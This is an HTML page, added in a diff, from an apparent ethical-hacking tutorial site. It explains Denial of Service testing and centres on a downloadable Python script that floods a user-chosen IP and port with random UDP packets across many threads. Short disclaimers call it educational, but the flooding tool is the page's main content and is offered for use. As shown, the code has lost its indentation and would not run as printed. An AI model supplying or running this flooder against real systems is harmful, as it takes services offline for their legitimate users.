@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>PEN-TEST | ADRIAN</title>
+  <link rel="stylesheet" href="../style.css" type="text/css" media="all" />
+</head>
+<body>
+
+  <div class="main-header">
+    <h1>CyberSHESH</h1>
+  </div>
+
+  <div class="main-home">
+    <h1>ETHICAL HACKING | PENETRATION TESTING</h1>
+    <hr />
+    <p>By: Adrian Martin</p>
+  </div>
+
+  <br />
+
+  <div class="main-NDM">
+    <h1>Denial of Service (DoS) Testing</h1>
+    <button class="back-btn"><a href="../CSh.html">BACK</a></button>
+  </div>
+
+  <div class="discription-NDM">
+    <h2>What is Denial of Service (DoS) Testing?</h2>
+    <h2>Denial of Service (DoS) Testing is a method of assessing a system's resilience by simulating traffic overload or resource exhaustion. In a typical DoS attack, a malicious actor floods a target server or network with excessive traffic, rendering it unavailable to legitimate users. The test aims to determine if the system can withstand such conditions without failure.</h2>
+    <br />
+    <h2>Why is it Important in Ethical Hacking and Penetration Testing?</h2>
+    <h2>Ethical hackers use DoS testing to:</h2>
+
+    <ul class="full-list">
+      <li>Identify performance bottlenecks or failure points under stress.</li>
+      <li>Evaluate firewall and rate-limiting configurations.</li>
+      <li>Detect unprotected UDP/TCP ports susceptible to abuse.</li>
+      <li>Ensure system availability during high traffic conditions.</li>
+    </ul>
+
+    <h2>This proactive testing is essential for critical systems that require high uptime, enabling organizations to implement defenses like traffic filtering, redundancy, and traffic shaping.</h2>
+
+    <h2>Python Code: Denial of Service Testing</h2>
+    <div class="box-code">
+<pre><code>
+import socket
+import threading
+import random
+import time
+
+def flood(target_ip, target_port, thread_id):
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+while True:
+try:
+data = random._urandom(1024)
+sock.sendto(data, (target_ip, target_port))
+print(f"[Thread-{thread_id}] Sent packet to {target_ip}:{target_port}")
+except KeyboardInterrupt:
+break
+except Exception as e:
+print(f"[Thread-{thread_id}] Error: {e}")
+
+def start_attack(ip, port, threads):
+print(f"\n[!] Launching DoS Attack on {ip}:{port} with {threads} threads.\n")
+for i in range(threads):
+t = threading.Thread(target=flood, args=(ip, port, i))
+t.daemon = True
+t.start()
+
+try:
+while True:
+time.sleep(1)
+except KeyboardInterrupt:
+print("\n[!] Attack manually stopped.")
+
+if __name__ == "__main__":
+ip = input("Target IP: ")
+port = int(input("Target Port: "))
+threads = int(input("Number of Threads: "))
+start_attack(ip, port, threads)
+</code></pre>
+    </div>
+    <button class="downloadBTN"><a href="../SCRIPT/DOST.py">DOWNLOAD CODE</a></button>
+    <br />
+    <h2>Disclaimer:</h2>
+    <p>This content is for educational and authorized penetration testing purposes only. Never perform DoS testing without explicit permission. Unauthorized testing is illegal and can cause severe disruptions.</p>
+  </div>
+
+  <footer style="background-color: #111; padding: 20px; text-align: center; color: #fff; border-top: 2px solid red;">
+    <h2 style="color: red; margin-bottom: 10px;">For Educational Purpose Only!</h2>
+    <p>This website is built strictly for cybersecurity awareness and ethical hacking education.</p>
+    <p style="color: orange; font-weight: bold;">This page contains security features. Activities are being monitored.</p>
+    <p>Use at your own risk. Unauthorized testing on live systems is illegal.</p>
+    <p><a href="../privacy/privacy.html" style="color: red; text-decoration: underline;">Privacy & Legal Rights</a></p>
+    <br />
+    <p style="color: gray;">© 2025 CyberSHESH | Developed by Adrian Martin</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script src="../js/pycode.js"></script>
+</body>
+</html>
